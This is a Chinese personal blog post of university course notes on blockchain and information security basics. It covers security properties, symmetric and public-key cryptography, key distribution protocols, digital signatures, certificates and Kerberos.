<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>区块链安全基础 | March</title><meta name="author" content="March"><meta name="copyright" content="March"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="概述信息安全，没有公认和统一的定义，但国内外对信息安全的论述大致可以分成两大类：◆一是指具体的信息系统的安全；◆二是指某一特定信息体系（比如一个国家的金融系统、军事指挥系统等）的安全。 网络安全，从本质上讲就是网络上信息的安全，即网络上信息保存、传输的安全，指网络系统的硬件、软件及其系统中的数据受到保护，不受偶然和或者恶意的原因而遭到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。 网络">
<meta property="og:type" content="article">
<meta property="og:title" content="区块链安全基础">
<meta property="og:url" content="http://example.com/2026/01/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="March">
<meta property="og:description" content="概述信息安全，没有公认和统一的定义，但国内外对信息安全的论述大致可以分成两大类：◆一是指具体的信息系统的安全；◆二是指某一特定信息体系（比如一个国家的金融系统、军事指挥系统等）的安全。 网络安全，从本质上讲就是网络上信息的安全，即网络上信息保存、传输的安全，指网络系统的硬件、软件及其系统中的数据受到保护，不受偶然和或者恶意的原因而遭到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。 网络">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/post14.jpg">
<meta property="article:published_time" content="2026-01-09T14:32:21.000Z">
<meta property="article:modified_time" content="2026-01-13T04:26:06.373Z">
<meta property="article:author" content="March">
<meta property="article:tag" content="区块链">
<meta property="article:tag" content="大学课程">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/post14.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "区块链安全基础",
  "url": "http://example.com/2026/01/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/",
  "image": "http://example.com/img/post14.jpg",
  "datePublished": "2026-01-09T14:32:21.000Z",
  "dateModified": "2026-01-13T04:26:06.373Z",
  "author": [
    {
      "@type": "Person",
      "name": "March",
      "url": "https://github.com/0xMarch-food"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/01/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '区块链安全基础',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/post14.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">March</span></a><a class="nav-page-title" href="/"><span class="site-name">区块链安全基础</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">区块链安全基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-09T14:32:21.000Z" title="发表于 2026-01-09 22:32:21">2026-01-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-13T04:26:06.373Z" title="更新于 2026-01-13 12:26:06">2026-01-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">16.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><strong>信息安全</strong>，没有公认和统一的定义，但国内外对信息安全的论述大致可以分成两大类：<br>◆一是指具体的<mark style="background: #BBFABBA6;">信息系统的安全</mark>；<br>◆二是指<mark style="background: #BBFABBA6;">某一特定信息体系（比如一个国家的金融系统、军事指挥系统等）的安全</mark>。</p>
<p><strong>网络安全</strong>，从本质上讲就是<strong>网络上信息的安全</strong>，即网络上信息保存、传输的安全，指<strong>网络系统的<mark style="background: #BBFABBA6;">硬件、软件</mark>及其系统中的<mark style="background: #BBFABBA6;">数据</mark>受到保护</strong>，不受偶然和或者恶意的原因而遭到破坏、更改、泄露，系统连续可靠正常地运行，网络服务不中断。</p>
<p>网络安全应包含4层含义：<br>◆运行系统安全，即信息处理和传输系统的安全。<br>◆网络上系统信息的安全，包括用口令鉴别、数据加密等。<br>◆网络上信息传播的安全，即信息传播后的安全。<br>◆网络上信息内容的安全，本质是保护用户的利益和隐私。</p>
<p>信息安全或网络安全的特征：<br>◆<mark style="background: #FFB8EBA6;"><strong>保密性</strong></mark>：保密性是指<strong>信息不泄漏</strong>给非授权的个人、实体和过程，或供其使用的特性。<br>◆<mark style="background: #FFB8EBA6;"><strong>完整性</strong></mark>：完整性是指信息<strong>未经授权不能被修改</strong>、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。对网络信息安全进行攻击其最终目的就是破坏信息的完整性。<br>◆<mark style="background: #FFB8EBA6;"><strong>可用性</strong></mark>：可用性是指合法用户访问并能按要求顺序使用信息的特性，即<strong>保证合法用户在需要时可以访问</strong>到信息及相关资产。<br>◆<mark style="background: #FFB8EBA6;"><strong>可控性</strong></mark>：可控性是指<strong>授权机构对信息的内容及传播具有控制能力</strong>的特性，可以控制授权范围内的信息流向以及方式。<br>◆<strong><mark style="background: #FFB8EBA6;">可审查性（抗抵赖性）</mark></strong>：在信息交流过程结束后，<strong>通信双方不能抵赖曾经做出的行为</strong>，也不能否认曾经接收到对方的信息。</p>
<blockquote>
<p>信息安全服务与目标主要是指<strong>保护信息系统</strong>，使其没有危险、不受威胁、不出事故。从技术角度来说，信息安全服务与目标<strong>主要表现在系统的保密性、完整性、可控性、可靠性、可用性、不可抵赖性等方面</strong>。</p>
</blockquote>
<p>网络信息安全技术需求：<br>◆网络物理安全<br>◆网络认证：网络认证是实现网络资源访问控制的前提和依据。作用是标识、鉴别网络资源访问者身份的真实性，防止用户假冒身份访问网络资源。<br>◆网络访问控制<br>◆网络安全保密：目的就是防止非授权的用户访问网上信息或网络设备。为此，重要的网络物理实体能够采用辐射干扰机技术，防止通过电磁辐射泄露机密信息。<br>◆网络安全监测：作用在于发现系统入侵活动和检查安全保护措施的有效性，以便及时报警给网络安全管理员，对入侵者采取有效措施，阻止危害扩散并调整安全策略。<br>◆网络漏洞评估：络系统中应需配备弱点或漏洞扫描系统，用以检测网络中是否存在安全漏洞。<br>◆ 防范网络恶意代码：网络是病毒、蠕虫、特洛伊木马等恶意代码传播最好、最快的途径之一。恶意代码危害性极大并且传播极为迅速，网络中一旦有一台主机感染了恶意代码，则恶意代码就完全有可能在极短的时间内迅速扩散，传播到网络上的其他主机，造成信息泄露、文件丢失、机器死机等严重后果。<br>◆网络安全应急响应：网络安全事件不能完全消除，必须采取一些措施来保障在出现意外的情况下，能恢复网络系统的正常运转。 </p>
<p>网络信息安全策略：<br>◆威严的<mark style="background: #BBFABBA6;">法律</mark>：安全的基石是社会法律、法规和手段，即通过建立与信息安全相关的法律、法规，使非法分子慑于法律，不敢轻举妄动。<br>◆先进的<mark style="background: #BBFABBA6;">技术</mark>：先进的技术是信息安全的根本保障。<br>◆严格的<mark style="background: #BBFABBA6;">管理</mark>：各网络使用机构、企业和单位应建立相应的信息安全管理办法，加强内部管理，建立审计和跟踪体系，提高整体信息安全意识。</p>
<p>区块链安全的特点：<br>区块链技术是一种<mark style="background: #FFB8EBA6;">去中心化、不可篡改、可追溯</mark>的分布式账本技术，通过<mark style="background: #FFB8EBA6;"><strong>共识机制</strong>和<strong>加密算法</strong></mark>实现数据的可信共享与安全存储。</p>
<p>信息安全与区块链安全的关系：<br>◆信息安全与区块链安全有着<strong>共同的目标</strong>，即保护数据的机密性、完整性和可用性。<br>◆区块链技术为信息安全<strong>提供了新的解决方案和思路</strong>。<br>◆信息安全概念的普及和实践对区块链安全的发展也起到了<strong>积极的促进作用</strong>。</p>
<h1 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h1><p>密码学的英语单词是 Cryptograghy。（在web3经常出现的crypto指的是加密货币）<br>1949年，香农发表了著名论文 “密码体制的<strong>通信理论</strong>”。将密码推向科学轨道。<br>20世纪70年代：Diffie和Hellman提出了<strong>公钥密码学</strong>的概念，<strong>标志着非对称加密时代的开始</strong>。这一时期，出现了<strong>第一个公钥加密算法——RSA</strong>。</p>
<p>一个完整的<strong>保密通信系统</strong>由密码体制（包括密码算法以及所有可能的明文、密文和密钥）、信源、信宿和攻击者构成。<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E4%BF%9D%E5%AF%86%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F.png"><br>一个好的密码体制至少满足两个条件：<br>已知明文 p 和加密密钥 k_e 时，计算 c&#x3D;E_k_e(p) 容易；<br>在不知道解密密钥 k_d 时，由密文 c 推知明文 p 相当困难。</p>
<p><strong>密码体制</strong>，是指一组<strong>规则、算法、函数或程序</strong>，使保密通信双方能够正确地、容易地进行加密和解密。</p>
<ul>
<li>按加密和解密密钥是否相同：对称加密体制、非对称加密体制；</li>
<li>按历史发展：古典密码体制（如凯撒密码、维吉尼亚密码）、现代密码体制（如 AES、RSA）；</li>
</ul>
<p>◆<strong>对称密码体制的优缺点</strong>：<br>优势：加、解密处理速度快；保密度高。<br>劣势：密钥分发困难；密钥管理困难；无法源认证。<br>◆<strong>非对称密码体制的优缺点</strong>：<br>优势：密钥分发简单；密钥管理便捷；可以实现签名<br>劣势：加密、解密处理速度较慢；保密度相对较低</p>
<h1 id="关于密钥"><a href="#关于密钥" class="headerlink" title="关于密钥"></a>关于密钥</h1><p>现代密码学研究中，<strong>加解密算法一般都是公开的</strong>，所有的密码技术都依赖于密钥。当密码算法确定后，<mark style="background: #FFB8EBA6;">密码系统的保密程度就完全取决于密钥的保密程度</mark>。</p>
<h2 id="密钥的类型和组织结构"><a href="#密钥的类型和组织结构" class="headerlink" title="密钥的类型和组织结构"></a>密钥的类型和组织结构</h2><p>在一个密码系统中，按照加密的内容不同，密钥可以分为一般<strong>数据加密密钥（会话密钥）</strong> 和<strong>密钥加密密钥</strong>和<strong>主密钥</strong>。<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E5%AF%86%E9%92%A5%E7%BB%93%E6%9E%84.png"><br>◆会话密钥（Session Key），指两个通信终端用户一次通话或交换数据时使用的密钥。它<strong>位于密码系统中整个密钥层次的最低层</strong>，仅对临时的通话或交换数据使用。<br><strong>会话密钥若用来对传输的数据进行保护则称为数据加密密钥</strong>；若用作保护文件则称为文件密钥，若供通信双方专用就称为专用密钥。<br><mark style="background: #FFB8EBA6;">会话密钥大多是临时的、动态的，一次一密</mark>。</p>
<p>◆密钥加密密钥是为了保证两点间安全传递会话密钥或下层密钥而设置的，处在密钥管理的中间层次。在对称密码体制中，任两个节点间的密钥加密密钥却是相同的；在公钥密码体制的系统中，所有用户都拥有公、私钥对，会话密钥的传递可以用接收方的公钥加密来进行，接收方用自己的私钥解密，从而安全获得会话密钥。</p>
<p>◆主密钥位于密码系统中整个密钥层次的最高层，主要用于对密钥加密密钥、会话密钥或其它下层密钥的保护。</p>
<blockquote>
<p>从信息安全的角度看，密钥的生存期越短，破译的可能性就越小，所以，理论上一次一密钥最安全｡</p>
</blockquote>
<p>在实际应用中，尤其是在网络环境下，多采用<strong>层次化的密钥管理结构</strong>｡通常<strong>下一层的密钥由上一层密钥按照某种密钥算法生成</strong>，因此，<strong>掌握了主密钥，就有可能找出下层的各个密钥</strong>。 </p>
<h2 id="密钥管理技术"><a href="#密钥管理技术" class="headerlink" title="密钥管理技术"></a>密钥管理技术</h2><p>密钥管理涉及密钥的产生和存储、分发、使用、更新&#x2F;替换、备份和恢复、以及撤销和销毁等，涵盖了密钥的整个生存周期。 </p>
<p><strong>密钥长度足够长</strong>是保证安全通信的必要条件之一。密钥的生成一般与生成的算法有关，大部分密钥生成算法采用<strong>随机或伪随机过程来产生随机密钥</strong>。 </p>
<p>常用的密钥分配技术：静态分配技术和动态分配技术。<br>◆<strong>静态分配技术</strong>是一种由中心以离线方式预分配的技术，是 <strong>“面对面”</strong> 的分发，如到银行领取信用卡密钥，它具有安全性好的特点，是长期沿用的传统密钥管理技术，不过，它必须解决密钥的存储技术，<mark style="background: #FFB8EBA6;">静态分发只能以集中式机制存在</mark>。<br>◆<strong>动态分配技术</strong>是一种 <strong>“请求—分发”</strong> 的在线分发技术，如在网上申请用户密钥，它具有方便、及时的特点，但这种分配技术<strong>需要有专门的协议的支持</strong>，动态分配技术可采用有中心或无中心的机制。</p>
<p>密钥分配体制：集中式密钥分配体制和分布式密钥分配体制。<br>◆<strong>集中式分配体制</strong>是引入一个中心服务器（即密钥分配中心，KDC）。在这个体系中，团体中的<strong>任何一个实体与中心服务器共享一个密钥</strong>。它的典型代表是Kerboros协议。</p>
<p>例：A希望与B建立一个逻辑连接，并且需要一次性会话密钥来保护经过这个连接传输的数据，具体过程如下：<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%88%86%E9%85%8D%E4%BD%93%E5%88%B6.png"><br>（1）A→KDC：<code>IDA∥IDB∥N1</code></p>
<ul>
<li>A 的身份标识（ID_A）</li>
<li>B 的身份标识（ID_B）</li>
<li>一个随机数 &#x2F; 时间戳N1（防止重放攻击）<br>作用：告诉 KDC“我是 A，我要和 B 通信，请帮我分配会话密钥”。</li>
</ul>
<p>（2）KDC→A：<code>EKa[Ks∥IDA∥IDB∥N1∥EKb[Ks∥IDA]]</code><br>KDC 生成会话密钥并加密响应。它会做两件事：</p>
<ol>
<li><strong>生成会话密钥KS​</strong>：为 A 和 B 生成一个临时的会话密钥。</li>
<li><strong>加密两份信息</strong>：<ul>
<li>用 A 的主密钥KA​加密：内容包含KS​、B 的标识（ID_B）、A 的标识（ID_A）、N1等。</li>
<li>用 B 的主密钥KB​加密：内容包含KS​、A 的标识（ID_A）（这个加密包称为 “票据”）。<br>然后 KDC 将这两份加密信息<strong>一起发送给 A</strong>。</li>
</ul>
</li>
</ol>
<p>（3） A→B：<code>EKb[ Ks∥IDA]</code><br>A 收到 KDC 的响应后，用自己的主密钥KA​解密，得到<strong>会话密钥KS​</strong>，以及 KDC 用 B 的主密钥加密的 “票据”。<br>不过，A 无法解密这个票据（因为它是用 B 的主密钥KB​加密的），所以 A 直接将这个票据转发给 B。</p>
<p>（4）B→A：<code>EKs[ N2]</code><br>B用主密钥加密另一个随机数N2，并将加密结果发送给A，并告诉A，B当前是可以通信的。</p>
<p>（5）A→B：<code>EKs[f（N2）]</code><br>A响应B发送的信息N2，并对N2进行某种函数变换（如f函数），同时用会话密钥Ks进行加密，发送给B。 </p>
<blockquote>
<p>实际上在第(3)步已经完成了密钥的分配，第(4)(5)两步结合第(3)步执行的是认证功能，使B能够确认所收到的信息不是一个重放。</p>
</blockquote>
<p>◆<strong>分布式分配体制</strong>中网络中的主机具有相同的地位，<strong>他们之间的密钥分配取决于他们之间的协商</strong>，这种密钥分配方案要求有n个通信方的网络需要保存<code>[n(n-1)/2]</code>个主密钥，<strong>对于较大型的网络，这种方案是不适用的</strong>，但是在一个小型网络或一个大型网络的局部范围内，这中方案还是有用的。比较著名的有<strong>Diffie-Hellman密钥交换协议</strong>，但Diffie-Hellman密钥交换协议没有提供鉴别机制，不能抵抗中间人攻击。</p>
<p>例：通信双方A和B建立会话密钥的过程包括以下过程<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E5%88%86%E5%B8%83%E5%BC%8F%E5%88%86%E9%85%8D%E5%AF%86%E9%92%A5%E4%BD%93%E5%88%B6.png"><br>（1）A→B：<code>IDA∥N1</code><br>A向B发出一个请求，内容包括A的标识符IDA和一个一次性随机数N1，告诉B说A希望与B通信，并请B产生一个会话密钥用于安全通信。<br>（2）B→A：<code>EMKm[Ks∥IDA∥IDB∥f（N1）∥N2]</code><br>B使用与A共享的主密钥MKm对应答的信息进行加密并发送给A。<br>（3）A→B：<code>EKs[f（N2）]</code><br>A使用B产生的会话密钥Ks对f（N2）进行加密，并发送给B。 </p>
<h1 id="数字签名与认证技术"><a href="#数字签名与认证技术" class="headerlink" title="数字签名与认证技术"></a>数字签名与认证技术</h1><h2 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2><p>在区块链中，<strong>消息摘要（Message Digest）</strong> 是通过<strong>哈希函数（杂凑函数）</strong> 对任意长度的原始数据（如交易信息、区块内容）计算得到的<strong>固定长度、唯一的字符串</strong>，也常被称为<strong>哈希值</strong>或<strong>摘要值</strong>。<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B6%88%E6%81%AF%E6%91%98%E8%A6%81.png"><br><strong>哈希函数（杂凑函数）的安全性</strong>是指在现有的计算资源下，找到一个碰撞是不可能的。哈希函数在网络安全应用中，不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。</p>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名(Digital Signature)是手写签名的电字模拟，是通过电子信息计算处理，产生的一段特殊字符串消息，该消息具有与手写签名一样的特点，是<strong>可信的、不可伪造的、不可重用的、不可抵赖的以及不可修改的</strong>。</p>
<p>一个数字签名方案一般由<strong>签名算法</strong>和<strong>验证算法</strong>组成。<mark style="background: #FFB8EBA6;">签名算法的密钥是秘密的</mark>，只有签名人掌握；<mark style="background: #FFB8EBA6;">而验证算法则是公开的</mark>，以便他人验证。典型的数字签名方案有RSA签名体制、ElGamal签名体制。</p>
<p>签名到底是什么意思？<br><strong>签名与加密很相似</strong>，一般是签名者利用秘密密钥(私钥)对需签名的数据进行加密，验证方利用签名者的公开密钥(公钥)对签名数据做解密运算。<strong>签名与加密的不同之处在于，加密的目的是保护信息不被非授权用户访问，而签名的目的是让消息接收者确信信息的发送者是谁，信息是否被他人篡改</strong>。<br>◆数字签名流程（图源：March）<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E8%BF%87%E7%A8%8B.png"></p>
<p>还有一种具有仲裁方式的数字签名：将信息及其签名先发给仲裁者C，C对信息及其签名验证完成后，再连同一个表示已通过验证的指令一起发往收方B。</p>
<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>数字证书又称为数字标识（Digital Certificate，Digital ID），它提供了一种在网络上身份验证的方式，是用来标志和证明网络通信双方身份的数字信息文件。<strong>数字证书是由权威公正的第三方机构即CA中心签发的</strong>。以数字证书为核心的加密技术可以对网络上传输的信息进行加密和解密、数字签名和签名验证，确保网上传递信息的机密性、完整性，以及交易实体身份的真实性，签名信息的不可否认性，从而保障网络应用的安全性。    </p>
<p><strong>数字证书采用公钥密码体制，即利用一对互相匹配的密钥进行加密、解密</strong>。</p>
<p>◆加密传输流程<br>每个用户拥有一把仅为本人所掌握的私钥，用它进行解密和签名；同时拥有一把公钥，并可以对外公开，用于加密和验证签名。当发送一份保密文件时，<strong>发送方使用接收方的公钥对数据加密</strong>，<strong>而接收方则使用自己的私钥解密</strong>，这样，信息就可以安全无误地到达目的地了，即使被第三方截获，由于没有相应的私钥，也无法进行解密。通过数字的手段保证加密过程是一个不可逆过程，即只有用私钥才能解密。</p>
<table>
<thead>
<tr>
<th>场景</th>
<th>用法</th>
<th>目的</th>
</tr>
</thead>
<tbody><tr>
<td><strong>数字签名</strong></td>
<td>私钥加密摘要（签名）→ 公钥解密验签</td>
<td>证明消息 “是谁发的 + 没被改”</td>
</tr>
<tr>
<td><strong>加密传输</strong></td>
<td>公钥加密消息 → 私钥解密消息</td>
<td>保证消息 “只有接收方能看懂”</td>
</tr>
</tbody></table>
<p> 目前有多种格式的数字证书：X.509、PGP、X9.59等，其中X.509应用最为广泛。</p>
<p>一个证书的生命周期主要包括三个阶段，即证书初始化注册阶段、颁发投入工作阶段和撤消阶段。<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E8%AF%81%E4%B9%A6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png"></p>
<h2 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h2><p>认证（Authentication）是指核实真实身份的过程。</p>
<p>◆分类：<br>（1）单向认证：在网络服务认证过程中，服务方对客户方进行单方面的鉴别，而客户方不需要识别服务方的身份。<br>（2）双向认证：在网络服务认证过程中，不仅服务方对客户方要进行鉴别，而且客户方也要鉴别服务方的身份。（多了最后三步）<br>（3）第三方认证：在网络服务认证过程中，服务方和客户方的身份鉴别通过第三方来实现。</p>
<p>◆双向认证示意图：<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81.png"></p>
<p>◆认证实现技术：静态密码、短信密码、动态口令牌、数字签名、生物识别技术、双因素身份认证、身份的零知识证明…</p>
<p>◆Kerberos技术<br>Kerberos的基本原理是利用对称密码技术，使用可信的第三方来认证服务器的用户身份，并在用户和服务器之间建立安全信道。<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/kerberos%E8%BF%87%E7%A8%8B.png"><br>Kerberos 的设计目标:<br>1.安全性：能够有效防止攻击者假扮成另一个合法的授权用户。<br>2.可靠性：分布式服务器体系结构，提供相互备份。<br>3.对用户透明性<br>4.可伸缩：能够支持大数量的客户和服务器。</p>
<p>Kerberos工作流程：<br>◆第一步，Kerberos客户<mark style="background: #BBFABBA6;">向认证服务器AS申请票据TGT</mark>。<br>◆第二步，当认证服务器AS收到Kerberos客户发来的消息后，AS在认证数据库检查、确认Kerberos客户，并<mark style="background: #BBFABBA6;">产生一个会话密钥和票据TGT</mark>。<br>◆第三步，Kerberos客户收到AS 发来的TGT后，<mark style="background: #BBFABBA6;">使用自己的秘密密钥进行解密，得到会话密钥</mark>。然后利用解密的信息重新构造认证请求单，<mark style="background: #BBFABBA6;">向TGS发送请求，申请访问应用服务器所需要的票据(Ticket)</mark>。<br>◆第四步，将解密后的认证单信息与TGT中的信息进行比较。然后，<mark style="background: #BBFABBA6;">TGS生成新的会话密钥</mark>以供Kerberos客户和应用服务器使用，并利用各自的秘密密钥加密会话密钥。最后，<mark style="background: #BBFABBA6;">生成一个票据</mark>TGT发送给Kerberos客户，它由Kerberos客户实体名、地址、时间戳、限制时间、会话密钥组成。<br>豆包讲工作流程：<a target="_blank" rel="noopener" href="https://www.doubao.com/thread/w0cad1f3d04dc9f09">https://www.doubao.com/thread/w0cad1f3d04dc9f09</a></p>
